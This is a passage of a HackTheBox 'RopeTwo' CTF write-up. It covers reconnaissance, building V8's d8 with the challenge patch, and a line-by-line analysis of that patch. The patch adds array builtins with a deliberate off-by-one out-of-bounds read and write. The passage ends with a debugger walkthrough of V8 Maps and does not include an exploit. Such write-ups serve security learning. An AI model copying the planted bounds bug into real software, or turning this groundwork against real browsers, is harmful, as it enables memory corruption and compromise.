</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">Nmap</span> <span class="no">done</span><span class="p">:</span> <span class="mi">1</span> <span class="no">IP</span> <span class="no">address</span> <span class="p">(</span><span class="mi">1</span> <span class="no">host</span> <span class="no">up</span><span class="p">)</span> <span class="no">scanned</span> <span class="no">in</span> <span class="mi">141</span><span class="no">.64</span> <span class="no">seconds</span>
</span></span></code></pre></div><p>The port 22 was open, being the SSh, the other two were the ones running the webserver, port 5000 was running the GitLab and the port 8000 running a webserver.
Checking the port 5000:</p>
<p>






  
  
<figure><img src="/img/ropetwo/8000.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>

It seemed like the portfolio for a company showing their own version of V8 engine, which is the JavaScript Engine for the chromium based browsers, there was a download link for the browser, so without any second thought I downloaded it.</p>
<p>From the name of the archive it seemed like the chromium browser compressed into the POSIX tar archive, after extracting it seemed like the chromium browser as we expected it to be, although running it, just spawned the chromium browser, so that was it, nothing special came out of this.</p>
<p>Now, that being aside, the only port that was 8000, we had a link at the footer of the page which said <strong>Source</strong>, opening the link, we immediately see a subdomain <code>gitlab.ropetwo.htb</code>, which was as follows:-</p>
<p>






  
  
<figure><img src="/img/ropetwo/gitlab.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<h2 id="v8-exploitation" class="relative group">V8 Exploitation <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#v8-exploitation" aria-label="Anchor">#</a></span></h2><p>We immediately, sees a commit which was made, as I did some v8 pwn, I went to check on commit and found the <code>diff</code> file, using so, I moved further and started building v8 engine binary d8, I used the commit, prior to the <code>r4j</code> user made, which was at <a href="http:///gitlab.rope2.htb:5000/root/v8/commit/d91e8d8fca64679c8df05603b5ff7e58709c4801" target="_blank" rel="noreferrer">here</a></p>
<p>Now, first of all, we didn&rsquo;t has much thing to get started, as for starting to pwn the v8 engine of it, we had to build the binary named <code>d8</code>, since that was not provided. I fetched the v8 engine code from the google and checkout the last commit which was mentioned in the GitLab, following are the steps one could replicate to make their own version of the d8 by applying the <code>diff</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">d4mian@pwnbox:</span><span class="err">~</span><span class="nf">$</span> <span class="no">fetch</span> <span class="no">v8</span>
</span></span><span class="line"><span class="cl"><span class="nl">d4mian@pwnbox:</span><span class="err">~</span><span class="nf">$</span> <span class="no">cd</span> <span class="no">v8</span>
</span></span><span class="line"><span class="cl"><span class="nl">d4mian@pwnbox:</span><span class="err">~/</span><span class="nf">v8$</span> <span class="p">.</span><span class="err">/</span><span class="no">build</span><span class="err">/</span><span class="no">install-build-deps.sh</span>    
</span></span><span class="line"><span class="cl"><span class="no">d4mian@pwnbox</span><span class="p">:</span><span class="err">~/</span><span class="no">v8$</span> <span class="no">git</span> <span class="no">checkout</span> <span class="no">d91e8d8fca64679c8df05603b5ff7e58709c4801</span>
</span></span><span class="line"><span class="cl"><span class="nl">d4mian@pwnbox:</span><span class="err">~/</span><span class="nf">v8$</span> <span class="no">gclient</span> <span class="no">sync</span>
</span></span><span class="line"><span class="cl"><span class="nl">d4mian@pwnbox:</span><span class="err">~/</span><span class="nf">v8$</span> <span class="no">git</span> <span class="no">apply</span> <span class="no">..</span><span class="err">/</span><span class="no">patch.diff</span> 
</span></span><span class="line"><span class="cl"><span class="no">d4mian@pwnbox</span><span class="p">:</span><span class="err">~/</span><span class="no">v8$</span> <span class="p">.</span><span class="err">/</span><span class="no">tools</span><span class="err">/</span><span class="no">dev</span><span class="err">/</span><span class="no">v8gen.py</span> <span class="no">x64.release</span>
</span></span><span class="line"><span class="cl"><span class="nl">d4mian@pwnbox:</span><span class="err">~/</span><span class="nf">v8$</span> <span class="no">ninja</span> <span class="p">-</span><span class="no">C</span> <span class="p">.</span><span class="err">/</span><span class="no">out.gn</span><span class="err">/</span><span class="no">x64.release</span>
</span></span><span class="line"><span class="cl"><span class="nl">d4mian@pwnbox:</span><span class="err">~/</span><span class="nf">v8$</span> <span class="p">.</span><span class="err">/</span><span class="no">tools</span><span class="err">/</span><span class="no">dev</span><span class="err">/</span><span class="no">v8gen.py</span> <span class="no">x64.debug</span>
</span></span><span class="line"><span class="cl"><span class="nl">d4mian@pwnbox:</span><span class="err">~/</span><span class="nf">v8$</span> <span class="no">ninja</span> <span class="p">-</span><span class="no">C</span> <span class="p">.</span><span class="err">/</span><span class="no">out.gn</span><span class="err">/</span><span class="no">x64.debug</span>
</span></span></code></pre></div><p>This took some time, approximately 3 hours on my VM which had 3GB of RAM and 1 core, though I made both the debug version and release version, but the release version was more helpful because before doing this v8 exploitation challenge, I did the DownUnderCTF&rsquo;s &ldquo;Is it Pwn or Web?&rdquo; challenge which was close to same to this one, that being said, let&rsquo;s get started.</p>
<blockquote>
<p>Attachment: The <code>d8</code> binary and the exploits can be found here: <a href="https://github.com/D4mianWayne/PwnLand/tree/master/CTFs/RopeTwo_HackTheBox/Foothold" target="_blank" rel="noreferrer">https://github.com/D4mianWayne/PwnLand/tree/master/CTFs/RopeTwo_HackTheBox/Foothold</a></p>
</blockquote>
<p>The only obstacle one would really stumble upon during this challenge is the use of the Pointer Compression, this made the address representation in 32 bit, which resulted in the leak being hard to make something of, since the isolate root, the upper 32 bit value of an address which is used to access the data around the V8 heap turned out to be an issue. But going through this <a href="">blog</a>, this mentioned that we do not need to know about the isolate root address, if we could manage to massage the vulnerability to get <code>fakeobj</code> and the <code>addrof</code> primitive, then we can get through the pointer compression which would result in not being a problem.</p>
<p>First of all, we need to analyse the patch file such that we spot which commit specifically pushed changes and pushed it where exactly:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl">~/Pwning/HackTheBox/htb-rope2 $ cat patch.diff 
</span></span><span class="line"><span class="cl"><span class="gh">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
</span></span></span><span class="line"><span class="cl"><span class="gh">index 3c2fe33c5b4b330c509d2926bc1e30daa1e09dba..99f0271e035220cd7228e8f9d8959e3b248a6cb5 100644
</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/src/builtins/builtins-array.cc
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/src/builtins/builtins-array.cc
</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -297,6 +297,34 @@ BUILTIN(ArrayPrototypeFill) {
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>   return GenericArrayFill(isolate, receiver, value, start_index, end_index);
</span></span><span class="line"><span class="cl"> }
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="gi">+BUILTIN(ArrayGetLastElement)
</span></span></span><span class="line"><span class="cl"><span class="gi">+{
</span></span></span><span class="line"><span class="cl"><span class="gi">+	Handle&lt;JSReceiver&gt; receiver;
</span></span></span><span class="line"><span class="cl"><span class="gi">+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver, Object::ToObject(isolate, args.receiver()));
</span></span></span><span class="line"><span class="cl"><span class="gi">+	Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);
</span></span></span><span class="line"><span class="cl"><span class="gi">+	uint32_t len = static_cast&lt;uint32_t&gt;(array-&gt;length().Number());
</span></span></span><span class="line"><span class="cl"><span class="gi">+	FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());
</span></span></span><span class="line"><span class="cl"><span class="gi">+	return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(len)));
</span></span></span><span class="line"><span class="cl"><span class="gi">+}
</span></span></span><span class="line"><span class="cl"><span class="gi">+
</span></span></span><span class="line"><span class="cl"><span class="gi">+BUILTIN(ArraySetLastElement)
</span></span></span><span class="line"><span class="cl"><span class="gi">+{
</span></span></span><span class="line"><span class="cl"><span class="gi">+	Handle&lt;JSReceiver&gt; receiver;
</span></span></span><span class="line"><span class="cl"><span class="gi">+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver, Object::ToObject(isolate, args.receiver()));
</span></span></span><span class="line"><span class="cl"><span class="gi">+	int arg_count = args.length();
</span></span></span><span class="line"><span class="cl"><span class="gi">+	if (arg_count != 2) // first value is always this
</span></span></span><span class="line"><span class="cl"><span class="gi">+	{
</span></span></span><span class="line"><span class="cl"><span class="gi">+		return ReadOnlyRoots(isolate).undefined_value();
</span></span></span><span class="line"><span class="cl"><span class="gi">+	}
</span></span></span><span class="line"><span class="cl"><span class="gi">+	Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);
</span></span></span><span class="line"><span class="cl"><span class="gi">+	uint32_t len = static_cast&lt;uint32_t&gt;(array-&gt;length().Number());
</span></span></span><span class="line"><span class="cl"><span class="gi">+	Handle&lt;Object&gt; value;
</span></span></span><span class="line"><span class="cl"><span class="gi">+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, value, Object::ToNumber(isolate, args.atOrUndefined(isolate,1)));
</span></span></span><span class="line"><span class="cl"><span class="gi">+	FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());
</span></span></span><span class="line"><span class="cl"><span class="gi">+	elements.set(len,value-&gt;Number());
</span></span></span><span class="line"><span class="cl"><span class="gi">+	return ReadOnlyRoots(isolate).undefined_value();
</span></span></span><span class="line"><span class="cl"><span class="gi">+}
</span></span></span><span class="line"><span class="cl"><span class="gi">+
</span></span></span><span class="line"><span class="cl"><span class="gi"></span> namespace {
</span></span><span class="line"><span class="cl"> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
</span></span><span class="line"><span class="cl">                                               BuiltinArguments* args) {
</span></span><span class="line"><span class="cl"><span class="gh">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
</span></span></span><span class="line"><span class="cl"><span class="gh">index 92a430aa2c0cbc3d65fdf2f1f4f295824379dbd8..02982b1c858eb313befcb8ad9e396dcdfbf2f9ab 100644
</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/src/builtins/builtins-definitions.h
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/src/builtins/builtins-definitions.h
</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -319,6 +319,8 @@ namespace internal {
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>   TFJ(ArrayPrototypePop, kDontAdaptArgumentsSentinel)                          \
</span></span><span class="line"><span class="cl">   /* ES6 #sec-array.prototype.push */                                          \
</span></span><span class="line"><span class="cl">   CPP(ArrayPush)                                                               \
</span></span><span class="line"><span class="cl"><span class="gi">+  CPP(ArrayGetLastElement)                                                     \
</span></span></span><span class="line"><span class="cl"><span class="gi">+  CPP(ArraySetLastElement)                                                     \
</span></span></span><span class="line"><span class="cl"><span class="gi"></span>   TFJ(ArrayPrototypePush, kDontAdaptArgumentsSentinel)                         \
</span></span><span class="line"><span class="cl">   /* ES6 #sec-array.prototype.shift */                                         \
</span></span><span class="line"><span class="cl">   CPP(ArrayShift)                                                              \
</span></span><span class="line"><span class="cl"><span class="gh">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
</span></span></span><span class="line"><span class="cl"><span class="gh">index 6d53531f1cbf9b6669c6b98ea8779e8133babe8d..5db31e9b733cdaa1dd2049b72b7fb6392ea4a1ab 100644
</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/src/compiler/typer.cc
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/src/compiler/typer.cc
</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -1706,6 +1706,11 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>     // Array functions.
</span></span><span class="line"><span class="cl">     case Builtins::kArrayIsArray:
</span></span><span class="line"><span class="cl">       return Type::Boolean();
</span></span><span class="line"><span class="cl"><span class="gi">+    case Builtins::kArrayGetLastElement:
</span></span></span><span class="line"><span class="cl"><span class="gi">+      return Type::Receiver();
</span></span></span><span class="line"><span class="cl"><span class="gi">+    case Builtins::kArraySetLastElement:
</span></span></span><span class="line"><span class="cl"><span class="gi">+      return Type::Receiver();
</span></span></span><span class="line"><span class="cl"><span class="gi">+
</span></span></span><span class="line"><span class="cl"><span class="gi"></span>     case Builtins::kArrayConcat:
</span></span><span class="line"><span class="cl">       return Type::Receiver();
</span></span><span class="line"><span class="cl">     case Builtins::kArrayEvery:
</span></span><span class="line"><span class="cl"><span class="gh">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
</span></span></span><span class="line"><span class="cl"><span class="gh">index 7fd1e40f661461fdbcf9228c5ce9127c3428dc7b..3a9b97e4b6426e101ca0cdc97ce1cc92aa689968 100644
</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/src/init/bootstrapper.cc
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/src/init/bootstrapper.cc
</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -1660,6 +1660,10 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>                           Builtins::kArrayPrototypeLastIndexOf, 1, false);
</span></span><span class="line"><span class="cl">     SimpleInstallFunction(isolate_, proto, &#34;pop&#34;, Builtins::kArrayPrototypePop,
</span></span><span class="line"><span class="cl">                           0, false);
</span></span><span class="line"><span class="cl"><span class="gi">+    SimpleInstallFunction(isolate_, proto, &#34;GetLastElement&#34;, Builtins::kArrayGetLastElement,
</span></span></span><span class="line"><span class="cl"><span class="gi">+                          0, false);
</span></span></span><span class="line"><span class="cl"><span class="gi">+    SimpleInstallFunction(isolate_, proto, &#34;SetLastElement&#34;, Builtins::kArraySetLastElement,
</span></span></span><span class="line"><span class="cl"><span class="gi">+                          0, false);
</span></span></span><span class="line"><span class="cl"><span class="gi"></span>     SimpleInstallFunction(isolate_, proto, &#34;push&#34;,
</span></span><span class="line"><span class="cl">                           Builtins::kArrayPrototypePush, 1, false);
</span></span><span class="line"><span class="cl">     SimpleInstallFunction(isolate_, proto, &#34;reverse&#34;,
</span></span></code></pre></div><p>Breaking this down, the following lines:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl"><span class="gd">--- a/src/builtins/builtins-array.cc
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/src/builtins/builtins-array.cc
</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -297,6 +297,34 @@ BUILTIN(ArrayPrototypeFill) {
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>   return GenericArrayFill(isolate, receiver, value, start_index, end_index);
</span></span><span class="line"><span class="cl"> }
</span></span><span class="line"><span class="cl"> +BUILTIN(ArrayGetLastElement)
</span></span><span class="line"><span class="cl"><span class="gi">+{
</span></span></span><span class="line"><span class="cl"><span class="gi">+	Handle&lt;JSReceiver&gt; receiver;
</span></span></span><span class="line"><span class="cl"><span class="gi">+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver, Object::ToObject(isolate, args.receiver()));
</span></span></span><span class="line"><span class="cl"><span class="gi">+	Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);
</span></span></span><span class="line"><span class="cl"><span class="gi">+	uint32_t len = static_cast&lt;uint32_t&gt;(array-&gt;length().Number());
</span></span></span><span class="line"><span class="cl"><span class="gi">+	FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());
</span></span></span><span class="line"><span class="cl"><span class="gi">+	return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(len)));
</span></span></span><span class="line"><span class="cl"><span class="gi">+}
</span></span></span><span class="line"><span class="cl"><span class="gi">+
</span></span></span><span class="line"><span class="cl"><span class="gi">+BUILTIN(ArraySetLastElement)
</span></span></span><span class="line"><span class="cl"><span class="gi">+{
</span></span></span><span class="line"><span class="cl"><span class="gi">+	Handle&lt;JSReceiver&gt; receiver;
</span></span></span><span class="line"><span class="cl"><span class="gi">+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver, Object::ToObject(isolate, args.receiver()));
</span></span></span><span class="line"><span class="cl"><span class="gi">+	int arg_count = args.length();
</span></span></span><span class="line"><span class="cl"><span class="gi">+	if (arg_count != 2) // first value is always this
</span></span></span><span class="line"><span class="cl"><span class="gi">+	{
</span></span></span><span class="line"><span class="cl"><span class="gi">+		return ReadOnlyRoots(isolate).undefined_value();
</span></span></span><span class="line"><span class="cl"><span class="gi">+	}
</span></span></span><span class="line"><span class="cl"><span class="gi">+	Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);
</span></span></span><span class="line"><span class="cl"><span class="gi">+	uint32_t len = static_cast&lt;uint32_t&gt;(array-&gt;length().Number());
</span></span></span><span class="line"><span class="cl"><span class="gi">+	Handle&lt;Object&gt; value;
</span></span></span><span class="line"><span class="cl"><span class="gi">+	ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, value, Object::ToNumber(isolate, args.atOrUndefined(isolate,1)));
</span></span></span><span class="line"><span class="cl"><span class="gi">+	FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());
</span></span></span><span class="line"><span class="cl"><span class="gi">+	elements.set(len,value-&gt;Number());
</span></span></span><span class="line"><span class="cl"><span class="gi">+	return ReadOnlyRoots(isolate).undefined_value();
</span></span></span><span class="line"><span class="cl"><span class="gi">+}
</span></span></span><span class="line"><span class="cl"><span class="gi">+
</span></span></span></code></pre></div><p>Here the <code>/src/builtins/builtins-array.c</code> is used to denote that there are some new functions which are being added, this being mentioned the following two functions which were added here is the <code>ArrayGetLastElement</code> and the <code>ArraySetLastElement</code>, let&rsquo;s break those down one by one:-</p>
<ul>
<li>
<p>The <code>ArrayGetLastElement</code> as the name implies, it gets the last element from the array, first off it calculates the length in the variable <code>len</code> the returns the element stored as the <code>len</code> index, now i =f you pay attention here, the <code>len</code> here is an absolute length of the array, we know that since an array indexing starts from the <code>0</code>, to access the 0th element we do <code>array[0]</code> but here since the element is stored in an array and the value which is at the <code>len</code> index is being hence allowing us for Out-Of-Bound read by 1 element.</p>
</li>
<li>
<p>The <code>ArraySetLastElement</code> as the name says, this built-in function saves the value to the last index of the array, now here, as of the previous function, the <code>len</code> is counted by the length of the array and then elements defined would be overwritten at that index, <code>array[index] = element</code>. Yes, you&rsquo;re thinking corrrectly, we have Out-Of-Bound write here too but by 1 element.</p>
</li>
</ul>
<p>So, as above mentioned we know that there are 2 functions that we have use in order to exploit this specific patch of the binary and eventually the chrome browser.</p>
<p>As this is also going to be very detailed blog post, we will understand the concepts first then we will move on eventually.</p>
<p>As JavaScript is a dynamically typed language, the engine must store type information with every runtime value. In v8, this is accomplished through a combination of pointer tagging and the use of dedicated type information objects, called Maps. These Maps are used to keep the track of the objects created at runtime, since this is how objects are handle, overwriting the map would lead to some internal type confusion within the V8 engine itself.
As of now, you might be thinking how exactly we access Maps and most importantly &ldquo;How do we recognize a Map?&rdquo;, for this I used the debug version of the <code>d8</code> binary. that binary when run with the <code>allow-natives-syntax</code> will let you use the <code>%DebugPrint(&lt;object&gt;)</code> which will print the related information of the objects, let&rsquo;s say, for example, we declared the array with the elements and then use the <code>%DebugPrint(arr)</code> to get all the information about an objects including but not limited to:-</p>
<ul>
<li>Map address</li>
<li>Element Pointer</li>
<li>Type Information etc.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">d4mian@pwnbox:</span><span class="err">~/</span><span class="nf">Pwning</span><span class="err">/</span><span class="no">v8</span><span class="err">/</span><span class="no">out.gn</span><span class="err">/</span><span class="no">x64.debug$</span> <span class="no">gdb</span> <span class="p">.</span><span class="err">/</span><span class="no">d8</span> 
</span></span><span class="line"><span class="cl"><span class="no">GNU</span> <span class="no">gdb</span> <span class="p">(</span><span class="no">Ubuntu</span> <span class="mi">8</span><span class="no">.1-0ubuntu3.2</span><span class="p">)</span> <span class="mi">8</span><span class="no">.1.0.20180409-git</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="na">..snip..</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">Reading</span> <span class="no">symbols</span> <span class="no">from</span> <span class="p">.</span><span class="err">/</span><span class="no">d8...done.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">r</span> <span class="p">--</span><span class="no">allow-natives-syntax</span> 
</span></span><span class="line"><span class="cl"><span class="no">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mian</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">v8</span><span class="err">/</span><span class="no">out.gn</span><span class="err">/</span><span class="no">x64.debug</span><span class="err">/</span><span class="no">d8</span> <span class="p">--</span><span class="no">allow-natives-syntax</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">Thread</span> <span class="no">debugging</span> <span class="no">using</span> <span class="no">libthread_db</span> <span class="no">enabled</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Using</span> <span class="no">host</span> <span class="no">libthread_db</span> <span class="no">library</span> <span class="err">&#34;/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libthread_db.so.1</span><span class="err">&#34;</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">New</span> <span class="no">Thread</span> <span class="mi">0x7ffff254f700</span> <span class="p">(</span><span class="no">LWP</span> <span class="mi">8196</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="nf">V8</span> <span class="no">version</span> <span class="mi">8</span><span class="no">.5.0</span> <span class="p">(</span><span class="no">candidate</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">d8</span><span class="err">&gt;</span> <span class="no">var</span> <span class="no">arr</span> <span class="err">=</span> <span class="p">[</span><span class="mi">1</span><span class="no">.1</span><span class="p">,</span> <span class="mi">2</span><span class="no">.2</span><span class="p">,</span> <span class="mi">3</span><span class="no">.3</span><span class="p">]</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">undefined</span>
</span></span><span class="line"><span class="cl"><span class="nf">d8</span><span class="err">&gt;</span> <span class="nv">%DebugPrint</span><span class="p">(</span><span class="no">arr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">DebugPrint:</span> <span class="err">0</span><span class="nl">xe81080c5e45:</span> <span class="err">[</span><span class="nf">JSArray</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">map:</span> <span class="err">0</span><span class="nf">x0e8108281909</span> <span class="err">&lt;</span><span class="no">Map</span><span class="p">(</span><span class="no">PACKED_DOUBLE_ELEMENTS</span><span class="p">)</span><span class="err">&gt;</span> <span class="p">[</span><span class="no">FastProperties</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">prototype:</span> <span class="err">0</span><span class="nf">x0e810824923d</span> <span class="err">&lt;</span><span class="no">JSArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">elements:</span> <span class="err">0</span><span class="nf">x0e81080c5e25</span> <span class="err">&lt;</span><span class="no">FixedDoubleArray</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="err">&gt;</span> <span class="p">[</span><span class="no">PACKED_DOUBLE_ELEMENTS</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">length:</span> <span class="err">3</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">properties:</span> <span class="err">0</span><span class="nf">x0e81080406e9</span> <span class="err">&lt;</span><span class="no">FixedArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="err">&gt;</span> <span class="err">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#length: 0x0e81081c0165 &lt;AccessorInfo&gt; (const accessor descriptor)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="err">}</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">elements:</span> <span class="err">0</span><span class="nf">x0e81080c5e25</span> <span class="err">&lt;</span><span class="no">FixedDoubleArray</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="err">&gt;</span> <span class="err">{</span>
</span></span><span class="line"><span class="cl">           <span class="err">0:</span> <span class="err">1</span><span class="nf">.1</span>
</span></span><span class="line"><span class="cl">           <span class="err">1:</span> <span class="err">2</span><span class="nf">.2</span>
</span></span><span class="line"><span class="cl">           <span class="err">2:</span> <span class="err">3</span><span class="nf">.3</span>
</span></span><span class="line"><span class="cl"> <span class="err">}</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">xe8108281909:</span> <span class="err">[</span><span class="nf">Map</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">type:</span> <span class="nf">JS_ARRAY_TYPE</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">instance</span> <span class="no">size</span><span class="p">:</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">inobject</span> <span class="no">properties</span><span class="p">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">elements</span> <span class="no">kind</span><span class="p">:</span> <span class="no">PACKED_DOUBLE_ELEMENTS</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">unused</span> <span class="no">property</span> <span class="no">fields</span><span class="p">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">enum</span> <span class="no">length</span><span class="p">:</span> <span class="no">invalid</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">back</span> <span class="no">pointer</span><span class="p">:</span> <span class="mi">0x0e81082818e1</span> <span class="err">&lt;</span><span class="no">Map</span><span class="p">(</span><span class="no">HOLEY_SMI_ELEMENTS</span><span class="p">)</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">prototype_validity</span> <span class="no">cell</span><span class="p">:</span> <span class="mi">0x0e81081c0451</span> <span class="err">&lt;</span><span class="no">Cell</span> <span class="no">value</span><span class="err">=</span> <span class="mi">1</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">instance</span> <span class="no">descriptors</span> <span class="c1">#1: 0x0e8108249911 &lt;DescriptorArray[1]&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="err">-</span> <span class="nf">transitions</span> <span class="c1">#1: 0x0e810824995d &lt;TransitionArray[4]&gt;Transition array #1:
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>     <span class="err">0</span><span class="nf">x0e8108042f3d</span> <span class="err">&lt;</span><span class="no">Symbol</span><span class="p">:</span> <span class="p">(</span><span class="no">elements_transition_symbol</span><span class="p">)</span><span class="err">&gt;</span><span class="p">:</span> <span class="p">(</span><span class="no">transition</span> <span class="no">to</span> <span class="no">HOLEY_DOUBLE_ELEMENTS</span><span class="p">)</span> <span class="p">-</span><span class="err">&gt;</span> <span class="mi">0x0e8108281931</span> <span class="err">&lt;</span><span class="no">Map</span><span class="p">(</span><span class="no">HOLEY_DOUBLE_ELEMENTS</span><span class="p">)</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">prototype:</span> <span class="err">0</span><span class="nf">x0e810824923d</span> <span class="err">&lt;</span><span class="no">JSArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">constructor:</span> <span class="err">0</span><span class="nf">x0e8108249111</span> <span class="err">&lt;</span><span class="no">JSFunction</span> <span class="no">Array</span> <span class="p">(</span><span class="no">sfi</span> <span class="err">=</span> <span class="mi">0xe81081cc41d</span><span class="p">)</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">dependent</span> <span class="no">code</span><span class="p">:</span> <span class="mi">0x0e81080401ed</span> <span class="err">&lt;</span><span class="no">Other</span> <span class="no">heap</span> <span class="no">object</span> <span class="p">(</span><span class="no">WEAK_FIXED_ARRAY_TYPE</span><span class="p">)</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">construction</span> <span class="no">counter</span><span class="p">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[1</span><span class="nf">.1</span><span class="p">,</span> <span class="mi">2</span><span class="no">.2</span><span class="p">,</span> <span class="mi">3</span><span class="no">.3</span><span class="p">]</span>
